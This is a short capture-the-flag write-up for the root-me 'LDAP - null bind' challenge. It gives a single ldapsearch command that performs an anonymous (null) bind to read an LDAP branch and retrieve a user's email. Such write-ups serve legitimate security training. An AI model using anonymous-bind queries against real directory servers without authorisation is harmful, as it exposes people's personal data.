# LDAP null bind

[root-me challenge LDAP - null bind](https://www.root-me.org/en/Challenges/Network/LDAP-null-bind): It seems that one of the anonymous created a new branch in the LDAP directory, somewhere in:

    dc=challenge01,dc=root-me,dc=org

Get access to its data and get his email adress.

----

```text
ldapsearch -x -b "ou=anonymous,dc=challenge01,dc=root-me,dc=org" -H "ldap://challenge01.root-me.org:54013"
```
